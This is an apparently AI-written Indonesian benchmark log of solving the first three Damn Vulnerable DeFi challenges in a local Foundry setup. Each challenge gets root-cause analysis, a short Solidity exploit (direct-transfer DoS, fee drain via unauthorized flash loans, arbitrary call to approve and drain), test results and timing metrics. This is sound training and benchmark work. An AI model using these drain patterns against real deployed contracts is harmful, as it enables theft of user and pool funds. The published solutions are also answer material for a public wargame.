# Damn Vulnerable DeFi — Baseline (Challenge #1: Unstoppable)

**Misi:** Autonomous Bounty Intelligence & Skill Evolution — Pass 2 fase A, item #6
**Tanggal:** 16 November 2026
**Sumber:** https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry
(MIT, 515★, update 11 Nov 2026; port Foundry dari OpenZeppelin
Damn Vulnerable DeFi) — clone `--depth 1` ke `/tmp/dvd` (1,6 MB).
**Status:** Port BERJALAN di Foundry 1.9.0 untuk tantangan #1 (dengan
penyesuaian dependensi, lihat §1). Tantangan #1 SELESAI — baseline tercatat.
**Update fase C (16 Nov 2026 ~21:46 WIB): full port SIAP, tantangan #2
Naive Receiver + #3 Truster SELESAI — skor 3/13.** 10 tantangan tersisa.

## 1. Setup port — hasil uji

| Aspek | Hasil |
|---|---|
| Clone mentah (`/tmp/dvd`) + `forge build` | **GAGAL.** `lib/` berisi 4 submodul KOSONG (forge-std, openzeppelin-contracts, safe-contracts, openzeppelin-contracts-upgradeable) karena clone tanpa `--recurse-submodules`. Error pertama: `Source "lib/safe-contracts/contracts/GnosisSafe.sol" not found`. |
| Solusi untuk tantangan #1 | Proyek minimal `/tmp/dvd-baseline` (hanya file tantangan #1 + `DamnValuableToken` + `Utilities`) dengan dependensi dari copy lokal yang sudah ada: `forge-std` (dari hunt Sparklend) + `openzeppelin-contracts` **v4.9.3** (dari `safe-bugbounty/poc/hunter-passkey`). Build: **OK**. |
| Jebakan versi OZ | Port memakai path OZ v4 (`openzeppelin-contracts/security/ReentrancyGuard.sol`). Copy lokal OZ **v5.0.2 / v5.7.0 TIDAK COCOK** (di v5 path pindah ke `utils/ReentrancyGuard.sol`). Yang dipakai: v4.9.3 — diverifikasi path-nya ada sebelum copy. |
| Full port (13 level) | BELUM siap: `safe-contracts` + `openzeppelin-contracts-upgradeable` tidak punya copy lokal; butuh `git submodule update --init` (fetch jaringan) atau copy setara. Ditunda ke pass berikut — JANGAN dipaksa (sesuai tugas). |
| RPC / fork | Tidak dibutuhkan — semua tantangan DVD berjalan lokal (tanpa fork). |
| Foundry | 1.9.0 — kompatibel. Test berjalan 16 ms (plus ~2 detik compile). |

**Lokasi kerja:** proyek minimal `/tmp/dvd-baseline` (scratch, ephemeral —
bisa dibuat ulang dari `/tmp/dvd` + copy lib lokal). Solusi tantangan #1
yang sudah lolos disimpan permanen di repo ini:
`benchmarks/dvd-unstoppable-solution.t.sol` (84 baris).

**Update 16 Nov 2026 ~21:46 WIB (fase C, item #2): full port SIAP.**
`git submodule update --init lib/safe-contracts
lib/openzeppelin-contracts-upgradeable` di `/tmp/dvd` BERHASIL (jaringan
OK): safe-contracts 5,7 MB (commit c36bcab), OZ-upgradeable 5,4 MB
(commit 25aabd2). `forge build` di repo penuh: **OK** (exit 0, hanya
warning lint deprecation OZ `_setupRole`). Tantangan #2 dan #3 dikerjakan
di repo penuh `/tmp/dvd` — tanpa proyek minimal lagi.

## 2. Tantangan #1 — Unstoppable

**Deskripsi (README tantangan):** pool lending dengan 1 juta DVT, menawarkan
flash loan gratis. Attacker mulai dengan 100 DVT. Tujuan: hentikan pool
sehingga tidak bisa lagi memberikan flash loan.

**Kontrak yang dibaca (sebelum solve):**
`src/Contracts/unstoppable/UnstoppableLender.sol` (62 baris),
`ReceiverUnstoppable.sol`, `DamnValuableToken.sol`, test
`Unstoppable.t.sol` (syarat sukses: `executeFlashLoan(10)` harus revert
dengan `UnstoppableLender.AssertionViolated`).

### Root cause (identifikasi sendiri dari membaca kode)

```solidity
function flashLoan(uint256 borrowAmount) external nonReentrant {
    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    if (balanceBefore < borrowAmount) revert NotEnoughTokensInPool();
    // Ensured by the protocol via the `depositTokens` function
    if (poolBalance != balanceBefore) revert AssertionViolated();
    ...
}
```

Pool melacak saldonya dengan akuntansi internal (`poolBalance`, hanya
bertambah lewat `depositTokens()`), lalu MENG-ASSERT bahwa akuntansi itu
sama dengan saldo token sebenarnya. Asumsi itu salah: SIAPA PUN bisa
`transfer` DVT langsung ke alamat pool — saldo riil naik TANPA menyentuh
`poolBalance`. Sejak itu `poolBalance != balanceBefore` SELAMANYA, dan
semua flash loan revert dengan `AssertionViolated`. Tidak ada fungsi
`sync` / koreksi — kerusakannya permanen (DoS).

**Kelas bug:** mismatch akuntansi internal vs saldo aktual (kelas yang
sama dengan donasi Euler di item #3 — di sana donasi merusak health
check, di sini transfer langsung merusak assert).

### Exploit (PoC — 1 baris efektif)

```solidity
vm.startPrank(attacker);
dvt.transfer(address(unstoppableLender), 1); // 1 wei cukup
vm.stopPrank();
```

### Hasil

```
forge test --match-contract Unstoppable
[PASS] testExploit() (gas: 99499)
Logs: 🧨 Let's see if you can break it... 🧨 / 🎉 Congratulations! 🎉
Suite result: ok. 1 passed; 0 failed — 16.15ms (test), ~2s total.
```

## 3. Baseline kemampuan (pengukuran jujur)

| Metrik | Hasil |
|---|---|
| Akurasi identifikasi bug | **1/1** — root cause benar di percobaan pertama, tanpa false positive |
| Root cause | Benar + tepat (mismatch `poolBalance` vs `balanceOf`, DoS permanen, tanpa fungsi sync) |
| Kualitas PoC | Minimal (1 transfer 1 wei) + memakai syarat sukses resmi test (`AssertionViolated`) |
| Ketepatan severity | Benar: **DoS/availability** — bukan pencurian dana. Di program bounty nyata ini kelas Medium (griefing, tak ada dana hilang), bukan Critical. |
| Waktu analisis | **~5 menit** dari membaca kontrak sampai exploit tertulis |
| Waktu setup port | **~25 menit** (mayoritas: dependensi — submodul kosong, OZ v4 vs v5, build repo penuh gagal) |
| Percobaan gagal | 0 untuk solve-nya; 2 untuk setup (build repo penuh gagal 2x sebelum proyek minimal) |

**Catatan kejujuran:** Unstoppable adalah tantangan #1 yang paling dikenal
di DVD — polanya sudah saya kenal dari literatur. Jadi baseline ini
mengukur EKSEKUSI (setup + solve + verifikasi berjalan), BUKAN penemuan
dari nol. Tantangan yang lebih sulit (truster, side-entrance, rewarder,
selfie, climber, ...) adalah pengukur yang sesungguhnya — di situlah
baseline akan diuji ulang di pass berikut. Skor baseline saat ini:
**3/13 tantangan selesai** (Unstoppable #1, Naive Receiver #2, Truster #3).

## 4. Yang dibawa ke perburuan

- Pola "akuntansi internal vs saldo aktual" adalah pola yang SAMA dengan
  Euler (donasi merusak health check) — dan muncul di banyak protokol
  (share-price, `totalAssets` vs `balanceOf`, `poolBalance` vs saldo).
  Di audit berikutnya, setiap `assert(balance == accounting)` atau
  `require(balance == expected)` WAJIB ditanya: "bisakah saldo berubah
  tanpa lewat fungsi yang mengupdate akuntansi?" (transfer langsung,
  donasi, `selfdestruct` force-ETH, rebate, dsb.)
- Setup port DVD sekarang terdokumentasi — tantangan #2–#13 tinggal
  menambah file level + 2 lib yang kurang (safe-contracts,
  OZ-upgradeable), tanpa mengulang riset dependensi.

## 5. Langkah berikut

- [x] Lengkapi setup full port (fetch `safe-contracts` +
  `openzeppelin-contracts-upgradeable` sebagai submodul) — **SELESAI
  16 Nov 2026 ~21:46 WIB (fase C)**: `git submodule update --init`
  berhasil, `forge build` repo penuh OK.
- [x] Kerjakan tantangan #2 naive-receiver → #3 truster — **SELESAI
  (lihat §6–§7)**.
- [ ] Kerjakan tantangan #4–#13, catat per tantangan: akurasi,
  root cause, false positive, waktu.
- [ ] Bandingkan baseline SEBELUM vs SESUDAH skill baru dipakai (item #1
  invariant testing, item #4 aeon sc-audit) — itulah fungsi benchmark ini.

## 6. Tantangan #2 — Naive Receiver (fase C, 16 Nov 2026 ~21:46 WIB)

**Deskripsi:** pool flash loan ETH 1.000 ETH, fee tetap 1 ETH per
pinjaman. Receiver (korban) memegang 10 ETH. Tujuan: kuras receiver
sampai 0 (pool berakhir dengan 1.000 + 10 ETH).

**Kontrak yang dibaca (sebelum solve):**
`src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol` (flashLoan +
cek pelunasan), `FlashLoanReceiver.sol` (receiveEther + repay),
test `NaiveReceiver.t.sol` (syarat sukses: saldo receiver 0, saldo pool
1.010 ETH).

### Root cause (identifikasi sendiri dari membaca kode)

```solidity
function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {
    ...
    borrower.functionCallWithValue(
        abi.encodeWithSignature("receiveEther(uint256)", FIXED_FEE), borrowAmount);
    if (address(this).balance < balanceBefore + FIXED_FEE)
        revert FlashLoanHasNotBeenPaidBack();
}
```

Dua cacat yang bergabung: (1) **siapa pun** boleh memicu flash loan
ATAS NAMA borrower mana pun — tidak ada cek `msg.sender == borrower`;
(2) **fee 1 ETH dibebankan ke borrower**, bukan ke pemanggil.
`receiveEther` pada receiver memaksa receiver membayar `msg.value +
fee` dari saldonya sendiri. Dengan `borrowAmount = 0`, receiver tetap
dipanggil dan tetap membayar fee 1 ETH — padahal ia tidak meminjam
apa-apa dan tidak pernah menyetujui apa-apa. 10x panggilan × 1 ETH =
receiver 0, pool +10 ETH.

**Kelas bug:** otorisasi hilang pada pemicu aksi pihak ketiga +
biaya dibebankan ke pihak yang tidak menyetujui (unauthorized
third-party action + fee charged to victim). Di program bounty nyata:
dana pengguna terkuras tanpa persetujuan = **High** (bukan Critical —
kerugian terbatas pada saldo korban, bukan seluruh pool).

### Exploit (PoC — 1 loop)

```solidity
for (uint256 i = 0; i < 10; i++) {
    naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
}
```

### Hasil

```
forge test --match-contract NaiveReceiver
[PASS] testExploit() (gas: 414730)
Suite result: ok. 1 passed; 0 failed — 9.65ms
```

### Metrik

| Metrik | Hasil |
|---|---|
| Akurasi identifikasi bug | **1/1** — root cause benar percobaan pertama, tanpa false positive |
| Root cause | Benar + tepat (pemicu oleh siapa pun + fee ke borrower; borrow 0 tetap kena fee) |
| Kualitas PoC | Minimal (loop 10x, borrow 0) + memakai syarat sukses resmi test |
| Ketepatan severity | Benar: **High** — dana korban terkuras (10 ETH), bukan dana pool; kerugian terbatas |
| Waktu analisis | **~4 menit** (baca 2 kontrak + test, tulis exploit) |
| Percobaan gagal | 0 |

**Yang dibawa ke perburuan:** setiap fungsi yang memicu aksi ATAS NAMA
alamat lain WAJIB ditanya: "siapa yang membayar, dan apakah ia
menyetujui?" Pola yang sama muncul di dunia nyata sebagai: callback
yang bisa dipicu orang lain, fee/penalti yang dibebankan ke korban,
dan `flashLoan`/`execute` tanpa cek pemanggil. Di audit berikutnya,
cari fungsi dengan parameter `borrower`/`target`/`onBehalfOf` yang
tidak dicek terhadap `msg.sender`.

## 7. Tantangan #3 — Truster (fase C, 16 Nov 2026 ~21:46 WIB)

**Deskripsi:** pool flash loan 1.000.000 DVT. Tujuan: kuras seluruh
token pool ke attacker.

**Kontrak yang dibaca (sebelum solve):**
`src/Contracts/truster/TrusterLenderPool.sol` (40 baris),
test `Truster.t.sol` (syarat sukses: saldo pool 0, saldo attacker
1.000.000 DVT).

### Root cause (identifikasi sendiri dari membaca kode)

```solidity
function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data)
    external nonReentrant {
    ...
    damnValuableToken.transfer(borrower, borrowAmount);
    target.functionCall(data);   // <-- panggilan ARBITRER, msg.sender = pool
    ...
    if (balanceAfter < balanceBefore) revert FlashLoanHasNotBeenPaidBack();
}
```

Satu cacat fatal: pool mengeksekusi panggilan eksternal ke **target
dan data arbitrer** dengan `msg.sender = pool`. Tidak ada whitelist
target, tidak ada validasi data. Penyerang memanggil
`flashLoan(0, attacker, address(dvt), approve(attacker, max))` — pool
sendiri yang memberi allowance tak terbatas kepada penyerang atas dana
pool. `borrowAmount = 0` membuat cek saldo akhir tetap lolos (saldo
tidak berubah selama flash loan). Lalu `transferFrom(pool, attacker,
1.000.000)` menguras semuanya.

**Kelas bug:** arbitrary external call dengan identitas pool
(unchecked `target.functionCall(data)`) — setara dengan "pool menandatangani
apa pun yang diminta penyerang". Di program bounty nyata: **Critical** —
pengurasan total dana pool dalam 2 transaksi, tanpa modal, tanpa
privilege.

### Exploit (PoC — 2 panggilan efektif)

```solidity
bytes memory data = abi.encodeWithSignature(
    "approve(address,uint256)", attacker, type(uint256).max
);
vm.startPrank(attacker);
trusterLenderPool.flashLoan(0, attacker, address(dvt), data);
dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
vm.stopPrank();
```

### Hasil

```
forge test --match-contract Truster
[PASS] testExploit() (gas: 152510)
Suite result: ok. 1 passed; 0 failed — 9.36ms
```

### Metrik

| Metrik | Hasil |
|---|---|
| Akurasi identifikasi bug | **1/1** — root cause benar percobaan pertama, tanpa false positive |
| Root cause | Benar + tepat (arbitrary call sebagai pool → approve → drain) |
| Kualitas PoC | Minimal (2 panggilan efektif) + memakai syarat sukses resmi test |
| Ketepatan severity | Benar: **Critical** — pengurasan total pool, tanpa modal/privilege |
| Waktu analisis | **~4 menit** (baca 1 kontrak + test, tulis exploit) |
| Percobaan gagal | 0 |

**Yang dibawa ke perburuan:** setiap `functionCall` / `call` / `delegatecall`
dengan `target` + `data` dari input pengguna WAJIB ditanya: "siapa
`msg.sender` saat panggilan itu dieksekusi, dan apa yang bisa dilakukan
penerima panggilan dengan identitas itu?" Pola yang sama muncul di dunia
nyata sebagai: flash loan dengan callback arbitrer, `multicall` tanpa
whitelist, dan "execute" generik pada vault/pool. Perbaikan kanonik:
whitelist target + selector, atau hapus parameter `target`/`data`
sepenuhnya (flash loan yang benar hanya memanggil `borrower` yang
sudah dikenal).

## 8. Ringkasan progres benchmark (16 Nov 2026 ~21:46 WIB)

| Tantangan | Root cause | Severity | Waktu analisis | Percobaan gagal | Solusi |
|---|---|---|---|---|---|
| #1 Unstoppable | Akuntansi internal vs saldo aktual | Medium (DoS) | ~5 mnt | 0 | `benchmarks/dvd-unstoppable-solution.t.sol` |
| #2 Naive Receiver | Pemicu pihak ketiga tanpa auth + fee ke korban | High | ~4 mnt | 0 | `benchmarks/dvd-naive-receiver-solution.t.sol` |
| #3 Truster | Arbitrary call sebagai pool → approve → drain | Critical | ~4 mnt | 0 | `benchmarks/dvd-truster-solution.t.sol` |

**Skor: 3/13.** Akurasi identifikasi 3/3 percobaan pertama, 0 false
positive, 0 percobaan gagal. **Catatan kejujuran:** ketiga tantangan
ini adalah tantangan DVD paling awal/paling dikenal — polanya sebagian
sudah saya kenal dari literatur. Pengukur sesungguhnya adalah tantangan
#4+ (side-entrance, rewarder, selfie, climber, ...), yang menuntut
chaining + interaksi multi-kontrak.
